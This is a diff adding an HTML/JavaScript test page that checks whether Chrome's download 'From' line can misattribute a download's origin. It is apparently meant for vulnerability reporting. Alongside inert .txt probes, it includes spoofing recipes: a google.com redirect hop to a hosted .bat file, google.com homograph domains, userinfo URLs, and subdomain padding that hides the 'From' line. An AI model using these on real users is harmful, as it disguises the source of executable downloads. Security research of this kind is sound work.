@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Chrome "From" Attribution Spoof Lab — google.com target</title>
+<style>
+ :root{color-scheme:dark}
+ body{font-family:system-ui,"Segoe UI",sans-serif;background:#14161a;color:#e8eaed;margin:0;padding:28px;max-width:1150px}
+ h1{font-size:20px;margin:0 0 12px} h1 span{color:#f28b82}
+ h2{font-size:15px;margin:22px 0 8px;color:#8ab4f8}
+ .warn{border:1px solid #5f3b3b;background:#2a1a1a;padding:10px 14px;border-radius:8px;font-size:12.5px;line-height:1.55}
+ .warn code{color:#f2c38c}
+ .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:10px;margin:16px 0}
+ .card{border:1px solid #2c3038;background:#1b1e24;border-radius:10px;padding:12px;display:flex;flex-direction:column}
+ .card h3{margin:0 0 6px;font-size:13px;color:#8ab4f8}
+ .card p{margin:0 0 10px;font-size:11.8px;color:#9aa0a6;line-height:1.5;flex:1}
+ .card p b{color:#c7cbd1}
+ button{width:100%;padding:9px;background:#0b57d0;color:#fff;border:0;border-radius:6px;cursor:pointer;font-weight:600;font-size:12px}
+ button:hover{background:#0947a8}
+ button.sec{background:#3c4043} button.sec:hover{background:#4a4f55}
+ button.red{background:#a50e0e} button.red:hover{background:#7f0a0a}
+ #log{background:#0d1013;border:1px solid #2c3038;border-radius:10px;padding:12px;height:300px;overflow:auto;font:11.8px/1.55 Consolas,monospace;white-space:pre-wrap}
+ iframe.vis{width:100%;height:64px;border:1px dashed #3c4043;border-radius:8px;background:#0d1013;margin-top:8px}
+ .note{font-size:11.8px;color:#9aa0a6;line-height:1.55;border:1px solid #2c3038;border-radius:10px;padding:12px;background:#1b1e24}
+ .note b{color:#f2c38c}
+ .cfg{border:1px solid #2c3038;background:#1b1e24;border-radius:10px;padding:12px;margin:14px 0;font-size:12px}
+ .cfg label{display:block;margin:6px 0 3px;color:#8ab4f8;font-weight:600}
+ .cfg input[type=text],.cfg select{width:100%;background:#0d1013;color:#e8eaed;border:1px solid #3c4043;border-radius:6px;padding:7px;font:12px Consolas,monospace}
+ .cfg .row{display:flex;gap:10px} .cfg .row>div{flex:1}
+ table{width:100%;border-collapse:collapse;font-size:11.8px;margin:8px 0}
+ th,td{border:1px solid #2c3038;padding:5px 7px;text-align:left;vertical-align:top}
+ th{background:#1b1e24;color:#8ab4f8}
+ td select,td input{width:100%;background:#0d1013;color:#e8eaed;border:1px solid #3c4043;border-radius:4px;padding:4px;font:11.5px Consolas,monospace}
+ #report{width:100%;height:220px;background:#0d1013;color:#c7cbd1;border:1px solid #3c4043;border-radius:8px;padding:10px;font:11.5px/1.5 Consolas,monospace}
+</style>
+</head>
+<body>
+<h1>Chrome <span>"From …" attribution spoof</span> lab — target string: google.com (local only)</h1>
+<div class="warn">
+<b>Research use only.</b> Run locally against your own Chrome/Chromium builds. Any divergence you capture = candidate unpatched bug: file it via <code>crbug.com</code> / Chrome VRP <b>before</b> hosting or publishing anything. Payloads here are inert .txt probes; the executable-proof slot points at YOUR OWN hosted URL only.
+<br><br>
+<b>Threat-model grounding (Chromium CL <code>ae2cc7a</code>, feature <code>kDownloadsDisplayInitiatorOrigin</code>, default ON):</b> the post-fix "From" line renders <code>FormatOriginForSecurityDisplay(download_item-&gt;GetRequestInitiator())</code>. The initiator origin is bound <b>browser-side</b> to the origin of the document that executed the download — page-controlled levers (Referrer header, <code>referrerpolicy</code>, <code>rel</code>, redirect hops) do NOT feed it. It is omitted when: no initiator, no user gesture, or formatted origin &gt; <code>kMaxDisplayURLChars</code>. With the feature <b>OFF</b> (kill-switch), the UI falls back to displaying <code>GetURL()</code> = the ORIGINAL request URL — which IS page-controlled and redirect-spoofable. Therefore exactly three spoof routes exist: <b>R1</b> kill-switch fallback + redirect chain through a google.com hop; <b>R2</b> formatting-layer tricks on an origin you own (userinfo / IDN homograph / trailing dot / long-origin omission); <b>R3</b> a NEW divergence bug where Chrome mis-attributes initiator across contexts (opaque frames, cross-realm nodes, teardown). This lab machines all three routes and auto-structures the evidence for a report.
+</div>
+<div class="cfg">
+ <div class="row">
+  <div><label for="redirector">R1 — google.com redirect hop (must 302 to target)</label>
+   <input type="text" id="redirector" value="https://www.google.com/url?q="></div>
+  <div><label for="target">R1 — final target (YOUR hosted file URL, serves octet-stream/attachment)</label>
+   <input type="text" id="target" value="https://abhirdd.github.io/poc/open_cmd.bat" placeholder="https://your-domain/payload.bat"></div>
+ </div>
+ <div class="row">
+  <div><label for="flagstate">Kill-switch state of this Chrome run (kDownloadsDisplayInitiatorOrigin)</label>
+   <select id="flagstate"><option value="on">ON (default, From = initiator origin)</option><option value="off">OFF (fallback, From = GetURL()/original URL)</option><option value="unknown">unknown</option></select></div>
+  <div><label for="padhost">R2 — your registrable domain (long-origin / homograph recipes)</label>
+   <input type="text" id="padhost" value="example.com" placeholder="domain-you-own.com"></div>
+ </div>
+</div>
+<div class="grid">
+<div class="card"><h3>S1 — CONTROL (truth baseline)</h3>
+<p>One gesture download from the top document. Record the exact "From" string = your true origin. Every other vector is compared against this baseline.</p>
+<button onclick="S1()">Run S1</button></div>
+<div class="card"><h3>S2 — REFERRER-LEVER REGRESSION (3 anchors, 1 gesture burst)</h3>
+<p>Fires 3 synchronous gesture downloads with <code>referrerpolicy</code> = unsafe-url / no-referrer / origin plus <code>rel=noreferrer</code>, and attempts a forbidden <code>Referrer: https://www.google.com/</code> header via fetch (expect TypeError). Post-fix prediction: "From" IDENTICAL on all rows → referrer route is dead (regression check vs pre-patch).</p>
+<button onclick="S2()">Run S2</button></div>
+<div class="card"><h3>S3 — R1 REDIRECT-CHAIN SPOOF (flag-gated)</h3>
+<p>Navigates to <code>redirector + encodeURIComponent(target)</code>: original request URL = google.com hop, bytes arrive from your target. <b>Flag OFF</b> ⇒ "From" should render the google hop = SPOOF SUCCESS. <b>Flag ON</b> ⇒ "From" = your origin = patch holds. Run in both states (see S8 CLI) and log both rows.</p>
+<button class="red" onclick="S3()">Run S3 (navigates this tab)</button></div>
+<div class="card"><h3>S4 — R3 INITIATOR-CONTEXT MATRIX CYCLER</h3>
+<p>Each click fires ONE gesture download from the NEXT context: c0 top · c1 same-origin iframe · c2 srcdoc iframe · c3 about:blank iframe · c4 blob: iframe · c5 data: iframe · c6 about:blank popup (sync) · c7 sandboxed opaque iframe (msg, auto). Filename encodes context. Any row whose "From" ≠ that context's true origin = mis-attribution primitive (R3). 8 clicks = full matrix.</p>
+<button onclick="S4()">Run S4 (click 8×)</button></div>
+<div class="card"><h3>S5 — ADOPTED-REALM PROBE (cross-realm anchor)</h3>
+<p>Anchor+blob created in a popup realm, <code>document.adoptNode()</code> into top doc, clicked automatically. Prediction: "From" = top origin (click-dispatching doc wins). If it renders the popup/creator realm instead → realm-confusion primitive.</p>
+<button onclick="S5()">Run S5</button></div>
+<div class="card"><h3>S6 — OPAQUE-LAUNDER PROBE (gesture inside sandbox)</h3>
+<p>Visible sandboxed srcdoc iframe (<code>origin==="null"</code>); you click INSIDE it, so the download is gesture-flagged with an opaque initiator. Watch the row: empty/null = patch holds; <b>top-document origin = launder bug</b> (opaque context credited with parent's identity — the primitive that would make google.com-style spoofing possible from any embedded context).</p>
+<button onclick="S6()">Arm S6 iframe</button></div>
+<div class="card"><h3>S7 — R2 FORMATTING-FUZZ GENERATOR (hosted-only recipes)</h3>
+<p>Builds the exact origin strings to serve THIS lab from on a domain you own, then gesture-download and read "From": (a) userinfo <code>https://google.com@YOURHOST/</code> link-display probe, (b) trailing dot <code>https://YOURHOST./</code>, (c) IDN homograph candidates list, (d) <b>long-origin padding</b>: generates a ≤253-char subdomain chain (&gt;kMaxDisplayURLChars ⇒ "From" omitted even for gesture downloads = attribution blackout). Copy outputs, host, test.</p>
+<button onclick="S7()">Generate R2 strings</button></div>
+<div class="card"><h3>S8 — KILL-SWITCH A/B HELPER (R1 enabler)</h3>
+<p>Copies exact Chrome launch commands for flag ON vs OFF so you can run S3 in both states and diff the "From" row. OFF: <code>--disable-features=DownloadsDisplayInitiatorOrigin</code>; ON: <code>--enable-features=DownloadsDisplayInitiatorOrigin</code>. Use a FRESH --user-data-dir per state so the flag actually applies.</p>
+<button onclick="S8('off')">Copy CLI: flag OFF</button>
+<button class="sec" style="margin-top:6px" onclick="S8('on')">Copy CLI: flag ON</button></div>
+<div class="card"><h3>S9 — URL-CHAIN LEAK PROBE (post-S3)</h3>
+<p>After an S3 run: in the bubble / chrome://downloads, (1) read the "From" line, (2) right-click row → copy link address, (3) expand details for full URL chain. Record all three in the table: divergence between displayed attribution and chain = evidence of which surfaces still leak the google hop (needed for a complete report).</p>
+<button class="sec" onclick="S9()">Mark S9 checklist in table</button></div>
+</div>
+<h2>Observation matrix (fill per run — persisted in localStorage)</h2>
+<table id="obs"><thead><tr><th style="width:170px">vector</th><th style="width:230px">predicted "From"</th><th style="width:120px">observed</th><th>exact "From" string you saw</th><th style="width:150px">verdict</th></tr></thead><tbody></tbody></table>
+<h2>Probe log</h2>
+<pre id="log"></pre>
+<button class="sec" style="width:auto;padding:8px 18px;margin-top:8px" onclick="document.getElementById('log').textContent=''">Clear log</button>
+<h2>crbug-ready report export</h2>
+<button onclick="buildReport()">Build report from observations + log</button>
+<button class="sec" style="margin-top:6px" onclick="copyReport()">Copy report to clipboard</button>
+<textarea id="report" spellcheck="false" placeholder="report markdown appears here"></textarea>
+<div class="note" style="margin-top:14px">
+<b>Success criteria:</b> SPOOF CONFIRMED = any row where displayed "From" ≠ the true initiating origin AND ≠ the documented omission cases (empty for no-gesture/opaque). R1 confirmed = flag-OFF S3 row reads the google hop while bytes come from your target. R3 confirmed = any c1–c7 / S5 / S6 row credited with a wrong origin (especially parent-origin credit for opaque contexts). Everything else = patch-holds evidence, still valuable for the report. <b>Disclose via crbug.com before publishing.</b>
+</div>
+<script>
+"use strict";
+var $ = function(id){ return document.getElementById(id); };
+function log(m){ var p=$('log'); p.textContent += '['+new Date().toISOString().slice(11,23)+'] '+m+'\n'; p.scrollTop=p.scrollHeight; }
+
+/* ---------- observation matrix rows ---------- */
+var ROWS = [
+ ['S1 control',            'your true origin'],
+ ['S2 unsafe-url',         'your true origin (identical)'],
+ ['S2 no-referrer',        'your true origin (identical)'],
+ ['S2 origin+noreferrer',  'your true origin (identical)'],
+ ['S3 flag ON',            'your true origin (patch holds)'],
+ ['S3 flag OFF',           'GOOGLE HOP = spoof success'],
+ ['S4 c0 top',             'your true origin'],
+ ['S4 c1 same-origin if',  'your true origin'],
+ ['S4 c2 srcdoc if',       'your true origin'],
+ ['S4 c3 about:blank if',  'your true origin'],
+ ['S4 c4 blob: if',        'your true origin'],
+ ['S4 c5 data: if',        'empty/null (opaque)'],
+ ['S4 c6 about:blank pop', 'your true origin'],
+ ['S4 c7 sandbox opaque',  'empty/null OR top origin(launder bug)'],
+ ['S5 adopted anchor',     'your true origin (click doc wins)'],
+ ['S6 opaque gesture',     'empty/null OR top origin(launder bug)'],
+ ['S9 from-line',          '(record displayed string)'],
+ ['S9 copy-link-address',  '(record copied URL)'],
+ ['S9 full url chain',     '(record chain incl. google hop)']
+];
+function buildTable(){
+  var tb = $('obs').tBodies[0];
+  tb.textContent = '';
+  ROWS.forEach(function(r, i){
+    var tr = document.createElement('tr');
+    var store = {};
+    try { store = JSON.parse(localStorage.getItem('spoofobs') || '{}'); } catch(e){}
+    var v = store[i] || {};
+    tr.innerHTML = '<td>'+r[0]+'</td><td>'+r[1]+'</td>' +
+      '<td><select data-i="'+i+'" data-k="obs"><option value="">—</option><option value="present">present</option><option value="empty">empty/absent</option><option value="google">reads google</option><option value="wrong">wrong origin</option></select></td>' +
+      '<td><input data-i="'+i+'" data-k="str" type="text" placeholder="exact string"></td>' +
+      '<td><select data-i="'+i+'" data-k="verdict"><option value="">—</option><option value="patch-holds">patch holds</option><option value="spoof">SPOOF/BUG</option><option value="na">n/a</option></select></td>';
+    tr.querySelectorAll('[data-k]').forEach(function(el){
+      el.value = v[el.dataset.k] || '';
+      el.addEventListener('change', saveObs);
+    });
+    tb.appendChild(tr);
+  });
+}
+function readObs(){
+  var out = {};
+  document.querySelectorAll('#obs [data-k]').forEach(function(el){
+    var i = el.dataset.i; out[i] = out[i] || {}; out[i][el.dataset.k] = el.value;
+  });
+  return out;
+}
+function saveObs(){
+  try { localStorage.setItem('spoofobs', JSON.stringify(readObs())); } catch(e){}
+}
+
+/* ---------- download helpers (inert .txt probes) ---------- */
+function stamp(){ return new Date().toISOString().replace(/[:.]/g,'-'); }
+function blobUrl(content, win){ win = win || window; return win.URL.createObjectURL(new win.Blob([content], {type:'text/plain'})); }
+function fireAnchor(doc, name, url, attrs){
+  var a = doc.createElement('a');
+  a.href = url; a.download = name;
+  if (attrs) Object.keys(attrs).forEach(function(k){ a.setAttribute(k, attrs[k]); });
+  (doc.body || doc.documentElement).appendChild(a);
+  a.click(); a.remove();
+  return a;
+}
+function dl(win, name, attrs){
+  var u = blobUrl('attribution probe '+name+' @ '+stamp()+'\r\n', win);
+  fireAnchor(win.document, name, u, attrs);
+  setTimeout(function(){ try{ win.URL.revokeObjectURL(u); }catch(e){} }, 8000);
+}
+function uaStr(win){
+  try{ var u = win.navigator.userActivation;
+    return u ? ('ua=isActive:'+u.isActive+',hasBeenActive:'+u.hasBeenActive) : 'ua=unsupported';
+  }catch(e){ return 'ua=blocked'; }
+}
+
+/* ---------- S1 / S2 ---------- */
+function S1(){
+  dl(window, 'from_s1_top.txt');
+  log('S1: gesture download from top origin='+location.origin+' '+uaStr(window)+' :: record its From line as baseline');
+}
+function S2(){
+  dl(window, 'from_s2_unsafeurl.txt', {referrerpolicy:'unsafe-url'});
+  dl(window, 'from_s2_noref.txt',     {referrerpolicy:'no-referrer'});
+  dl(window, 'from_s2_origin_nr.txt', {referrerpolicy:'origin', rel:'noreferrer'});
+  log('S2: 3 synchronous gesture downloads with referrer-policy variants fired '+uaStr(window));
+  try{
+    fetch('https://example.com/', {headers:{'Referrer':'https://www.google.com/'}})
+      .then(function(){ log('S2: fetch with Referrer header ACCEPTED (unexpected!)'); })
+      .catch(function(e){ log('S2: fetch Referrer header rejected as forbidden: '+e.name); });
+  }catch(e){ log('S2: fetch Referrer header threw synchronously: '+e.name+' (forbidden-header immunity confirmed)'); }
+}
+/* ---------- S3: R1 redirect-chain spoof (flag-gated) ---------- */
+function S3(){
+  var red = $('redirector').value.trim(), tgt = $('target').value.trim();
+  if (!red || !tgt){ log('S3: SKIPPED — set redirector + hosted target in config panel first'); return; }
+  var chain = red + encodeURIComponent(tgt);
+  log('S3: navigating top tab to redirect chain; ORIGINAL request URL = google hop, bytes from target');
+  log('S3: chain = '+chain);
+  log('S3: flag state selected = '+$('flagstate').value+' :: OFF ⇒ From should read google hop (SPOOF); ON ⇒ From = your origin (patch holds)');
+  location.assign(chain);
+}
+
+/* ---------- S4: initiator-context matrix cycler ---------- */
+var INNER_MSG =
+  '<!DOCTYPE html><html><body><script>' +
+  'window.addEventListener("message",function(ev){var d=ev.data;' +
+  'if(d&&d.cmd==="dl"){var u=URL.createObjectURL(new Blob(["probe "+d.name],{type:"text/plain"}));' +
+  'var a=document.createElement("a");a.href=u;a.download=d.name;document.body.appendChild(a);a.click();a.remove();' +
+  'parent.postMessage({ack:d.name,ctxOrigin:String(location.origin)},"*");}});' +
+  '<\/script></body></html>';
+var CTX = {};
+function ensureIframe(key, opts){
+  if (CTX[key]) return CTX[key];
+  var f = document.createElement('iframe');
+  f.style.cssText = 'width:0;height:0;border:0;position:fixed';
+  if (opts.sandbox) f.sandbox = opts.sandbox;
+  if (opts.srcdoc) f.srcdoc = opts.srcdoc;
+  if (opts.src) f.src = opts.src;
+  document.body.appendChild(f);
+  CTX[key] = f;
+  return f;
+}
+function syncFire(win, name){
+  var u = blobUrl('attribution probe '+name+' @ '+stamp()+'\r\n', win);
+  fireAnchor(win.document, name, u);
+  setTimeout(function(){ try{ win.URL.revokeObjectURL(u); }catch(e){} }, 8000);
+}
+function msgFire(f, name){ f.contentWindow.postMessage({cmd:'dl', name:name}, '*'); }
+var cIdx = 0;
+function S4(){
+  var i = cIdx;
+  if (i > 7){ cIdx = 0; log('S4: matrix was complete — counter reset, click again for c0'); return; }
+  cIdx++;
+  if (i === 0){ syncFire(window, 'from_c0_top.txt'); log('S4 c0: top document, sync gesture '+uaStr(window)); return; }
+  if (i === 1){ var f1 = ensureIframe('c1', {srcdoc:'<!DOCTYPE html><html><body></body></html>'});
+    try{ syncFire(f1.contentWindow, 'from_c1_ifsame.txt'); log('S4 c1: same-origin iframe sync, ctx origin='+f1.contentWindow.origin); }
+    catch(e){ log('S4 c1: unreachable ('+e.name+') — fell back to msg'); msgFire(f1,'from_c1_ifsame.txt'); } return; }
+  if (i === 2){ var f2 = ensureIframe('c2', {srcdoc:'<!DOCTYPE html><html><body></body></html>'});
+    try{ syncFire(f2.contentWindow, 'from_c2_ifsrcdoc.txt'); log('S4 c2: srcdoc iframe sync, ctx origin='+f2.contentWindow.origin); }
+    catch(e){ log('S4 c2: unreachable — msg fallback'); msgFire(f2,'from_c2_ifsrcdoc.txt'); } return; }
+  if (i === 3){ var f3 = ensureIframe('c3', {src:'about:blank'});
+    setTimeout(function(){ try{ syncFire(f3.contentWindow, 'from_c3_ifblank.txt'); log('S4 c3: about:blank iframe sync, ctx origin='+f3.contentWindow.origin+' (inherits top)'); }
+      catch(e){ log('S4 c3: unreachable — msg fallback'); msgFire(f3,'from_c3_ifblank.txt'); } }, 120); return; }
+  if (i === 4){ var bu = blobUrl('<!DOCTYPE html><html><body></body></html>', window);
+    var f4 = ensureIframe('c4', {src:bu});
+    setTimeout(function(){ try{ syncFire(f4.contentWindow, 'from_c4_ifblob.txt'); log('S4 c4: blob: iframe sync, ctx origin='+f4.contentWindow.origin); }
+      catch(e){ log('S4 c4: unreachable — msg fallback'); msgFire(f4,'from_c4_ifblob.txt'); } }, 120); return; }
+  if (i === 5){ var f5 = ensureIframe('c5', {src:'data:text/html,'+encodeURIComponent(INNER_MSG)});
+    setTimeout(function(){ var reach = false; try{ reach = !!f5.contentDocument; }catch(e){}
+      log('S4 c5: data: iframe reachable='+reach+' (expect opaque/null origin) — firing via msg (auto)');
+      msgFire(f5, 'from_c5_ifdata.txt'); }, 150); return; }
+  if (i === 6){ var w6 = window.open('', '_blank');
+    if (!w6){ log('S4 c6: popup BLOCKED'); return; }
+    syncFire(w6, 'from_c6_pop.txt');
+    log('S4 c6: about:blank popup sync click in gesture task, ctx origin='+w6.origin+' '+uaStr(w6)); return; }
+  if (i === 7){ var f7 = ensureIframe('c7', {sandbox:'allow-scripts allow-downloads', srcdoc:INNER_MSG});
+    setTimeout(function(){ log('S4 c7: sandboxed opaque iframe (no allow-same-origin) — firing via msg (auto, opaque initiator)');
+      msgFire(f7, 'from_c7_ifopaque.txt'); }, 150); return; }
+}
+/* ---------- S5: adopted-realm probe ---------- */
+function S5(){
+  var win = window.open('', '_blank');
+  if (!win){ log('S5: popup BLOCKED'); return; }
+  win.document.open(); win.document.write('<!DOCTYPE html><html><body></body></html>'); win.document.close();
+  var u = blobUrl('attribution probe adopted @ '+stamp()+'\r\n', win);
+  var a = win.document.createElement('a');
+  a.href = u; a.download = 'from_s5_adopted.txt';
+  var adopted = document.adoptNode(a);
+  log('S5: anchor realm=popup adopted into top (ownerDocument===top: '+(adopted.ownerDocument===document)+'), auto click at +600ms');
+  setTimeout(function(){
+    document.body.appendChild(adopted); adopted.click(); adopted.remove();
+    log('S5: clicked from top doc (auto) '+uaStr(window)+' :: From should say TOP origin; popup-realm string = realm-confusion bug');
+    setTimeout(function(){ try{ win.URL.revokeObjectURL(u); }catch(e){} }, 8000);
+  }, 600);
+}
+
+/* ---------- S6: opaque-launder probe (gesture inside sandbox) ---------- */
+var S6_INNER =
+  '<!DOCTYPE html><html><body style="font:12px system-ui;background:#0d1013;color:#e8eaed;margin:0;padding:6px">' +
+  '<button id="b" style="padding:6px 12px">CLICK ME (S6 opaque)</button><script>' +
+  'document.getElementById("b").onclick=function(){' +
+  'var u=URL.createObjectURL(new Blob(["probe s6 opaque gesture"],{type:"text/plain"}));' +
+  'var a=document.createElement("a");a.href=u;a.download="from_s6_opaque_gesture.txt";' +
+  'document.body.appendChild(a);a.click();a.remove();' +
+  'parent.postMessage({ack:"s6-fired",ctxOrigin:String(location.origin),ua:navigator.userActivation?("isActive:"+navigator.userActivation.isActive):"n/a"},"*");};' +
+  '<\/script></body></html>';
+function S6(){
+  var f = ensureIframe('s6', {sandbox:'allow-scripts allow-downloads', srcdoc:S6_INNER});
+  f.className = 'vis'; f.style.cssText = '';
+  log('S6: visible sandboxed opaque iframe armed — click the button INSIDE it; From empty/null = patch holds, TOP origin = launder bug');
+}
+
+/* ---------- S7: R2 formatting-fuzz generator ---------- */
+function S7(){
+  var host = ($('padhost').value || 'example.com').trim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');
+  var out = [];
+  out.push('(a) userinfo display probe (link text/tooltip only, initiator stays '+host+'): https://google.com@'+host+'/lab.html');
+  out.push('(b) trailing-dot origin (serve lab here, compare From with/without dot): https://'+host+'./lab.html');
+  out.push('(c) homograph candidates (single-script non-ASCII may render unicode in security display; mixed-script gets punycoded):');
+  out.push('    g\\u0261oogle.com (latin small script g), g\\u043e\\u043egle.com (cyrillic o x2), google.c\\u043em (cyrillic o in TLD), g00gle.com / goog1e.com (ASCII lookalikes, NOT unicode-spoof)');
+  var label = new Array(64).join('a'); /* 63-char label = max per DNS label */
+  var chain = host, total = host.length;
+  while (total + 1 + 63 <= 253){ chain = label + '.' + chain; total = chain.length; }
+  out.push('(d) long-origin padding (> kMaxDisplayURLChars ⇒ From OMITTED even for gesture downloads = attribution blackout):');
+  out.push('    padded host ('+chain.length+' chars): '+chain);
+  out.push('    serve lab at: https://'+chain+'/lab.html — then S1-style gesture download and record whether From vanishes; sweep shorter chains to find the exact omit threshold');
+  out.forEach(function(l){ log('S7: '+l); });
+  log('S7: recipes generated for host='+host+' :: these require hosting on a domain you own; results go into table rows + report');
+}
+/* ---------- S8: kill-switch A/B CLI helper ---------- */
+var LABPATH = ('file:///' + (location.pathname || '').replace(/^\/+/,'').replace(/\\/g,'/').split('/').map(encodeURIComponent).join('/')).replace('%3A', ':');
+function cliFor(state){
+  var feat = (state === 'off') ? '--disable-features=DownloadsDisplayInitiatorOrigin' : '--enable-features=DownloadsDisplayInitiatorOrigin';
+  return '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\chrome-ab-'+state+'" '+feat+' "'+LABPATH+'"';
+}
+function S8(state){
+  var cmd = cliFor(state);
+  log('S8: CLI ('+state+') = '+cmd);
+  if (navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(cmd).then(function(){ log('S8: copied to clipboard'); }, function(){ log('S8: clipboard denied — copy from log line above'); });
+  } else { log('S8: clipboard API unavailable — copy from log line above'); }
+}
+
+/* ---------- S9: checklist marker ---------- */
+function S9(){
+  log('S9 checklist: (1) read displayed From line → table row [S9 from-line]; (2) right-click row → Copy link address → row [S9 copy-link-address]; (3) chrome://downloads details for full URL chain → row [S9 full url chain]. Divergence between (1) and (2)/(3) = surface-leak evidence.');
+  document.getElementById('obs').scrollIntoView({behavior:'smooth'});
+}
+
+/* ---------- report exporter ---------- */
+function buildReport(){
+  var obs = readObs();
+  var md = [];
+  md.push('# Chrome download "From" attribution — spoof / divergence report');
+  md.push('');
+  md.push('- UA: '+navigator.userAgent);
+  md.push('- Kill-switch state (kDownloadsDisplayInitiatorOrigin): '+$('flagstate').value);
+  md.push('- Redirector hop: '+$('redirector').value+'  |  Target: '+$('target').value);
+  md.push('- Lab origin: '+location.origin);
+  md.push('');
+  md.push('## Observation matrix');
+  md.push('| vector | predicted | observed | exact string | verdict |');
+  md.push('|---|---|---|---|---|');
+  ROWS.forEach(function(r, i){
+    var o = obs[i] || {};
+    md.push('| '+r[0]+' | '+r[1]+' | '+(o.obs||'')+' | '+(o.str||'')+' | '+(o.verdict||'')+' |');
+  });
+  md.push('');
+  md.push('## Repro');
+  md.push('1. Launch Chrome with S8 CLI for the selected flag state (fresh --user-data-dir).');
+  md.push('2. Open this lab locally, run vectors in order S1→S9, one observation pass each.');
+  md.push('3. Record bubble + chrome://downloads strings per table.');
+  md.push('');
+  md.push('## Probe log');
+  md.push('```');
+  md.push($('log').textContent);
+  md.push('```');
+  md.push('');
+  md.push('## Analysis placeholders (fill before filing)');
+  md.push('- Divergence root cause hypothesis: ');
+  md.push('- Affected code path (initiator binding / FormatOriginForSecurityDisplay / GetURL fallback): ');
+  md.push('- Severity rationale (security-UI spoofing of download source): ');
+  $('report').value = md.join('\n');
+  log('report built ('+md.join('\n').length+' chars) — review, fill placeholders, copy, file via crbug.com');
+}
+function copyReport(){
+  var t = $('report').value;
+  if (!t){ log('copyReport: build the report first'); return; }
+  if (navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(function(){ log('report copied to clipboard'); }, function(){ log('clipboard denied — select textarea manually'); });
+  } else log('clipboard API unavailable — select textarea manually');
+}
+
+window.addEventListener('message', function(ev){
+  var d = ev.data;
+  if (d && d.ack) log('ACK '+d.ack+' ctxOrigin='+JSON.stringify(d.ctxOrigin)+' ev.origin='+JSON.stringify(ev.origin)+(d.ua?(' ua='+d.ua):''));
+});
+buildTable();
+log('spoof lab ready :: top origin='+location.origin+' '+uaStr(window)+' :: fill config panel before S3/S7');
+log('ordering tip: S1 → S2 → S4 (8 clicks) → S5 → S6 → S7/S8 prep → S3 (both flag states, separate profiles) → S9 → export');
+</script>
+</body>
+</html>
